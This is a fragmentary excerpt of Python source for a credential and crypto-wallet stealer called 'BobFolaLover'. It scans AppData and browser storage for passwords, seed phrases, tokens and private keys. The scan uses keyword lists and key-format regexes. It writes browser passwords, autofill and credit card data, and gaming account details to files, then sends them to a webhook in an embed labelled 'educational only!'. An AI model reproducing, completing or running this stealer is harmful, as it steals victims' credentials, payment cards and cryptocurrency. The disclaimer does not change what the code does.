...
class BobFolaLover:
    def __init__(self, webhook_url):
        ...
        self.di = []
        self.co = []
        self.d = os.path.join(os.getenv("APPDATA"), "Bobfola")
        self.keywords = ['password','passwords','wallet','wallets','phrase','seeds','private','key','seed','auth','mnemonic','token','secret']
                ...
                for file in os.listdir(leveldb_path):
                    ...
                    try:
                        ...
                        with open(file_path, "r", errors='ignore') as files:
                            content = files.read()
                            patterns = [
                                r"[5][1-9A-HJ-NP-Za-km-z]{50}",
                                r"[KL][1-9A-HJ-NP-Za-km-z]{51}",
                                r"(?:0x)?[a-fA-F0-9]{64}",
                                r"[A-Za-z0-9+/]{43}=",
                                r"[6T][1-9A-HJ-NP-Za-km-z]{50,51}",
                                r"ed25519_sk1[0-9a-z]{58,}",
                                r"edesk[1-9A-HJ-NP-Za-km-z]{50,}",
                                r"PVT_[A-Z0-9_]{5,7}_[1-9A-HJ-NP-Za-km-z]{50,}",
                                r"s[a-zA-Z0-9]{28,34}",
                                r"S[ABCDEFGHIJKLMNOPQRSTUVWXYZ234567]{55}",
                                r"[A-Za-z0-9+/=]{44}",
                                r"[a-fA-F0-9]{66}",
                                r"[a-fA-F0-9]{64}",
            ...
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("BOBFOLA BROWSER PASSWORD LOVER\n")
                        f.write("=" * 60 + "\n\n")
            ...
            if autofill_data:
                try:
                    with open(os.path.join(self.d, "autofill_data.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER AUTOFILL & CREDIT CARD LOVER\n")
                        f.write("=" * 60 + "\n\n")
            ...
            if game_data:
                try:
                    with open(os.path.join(self.d, "gaming_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("GAMING ACCOUNT LOVER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
            ...
            try:
                ...
                if self.p:
                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("BOBFOLA BROWSER DATA SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
        ...
        try:
            ...
            embed = {
                "embeds": [{
                    ...
                    "description": "by Bobfola, educational only!",
                    "color": 0xff0000,
                    "fields": embed_fields,
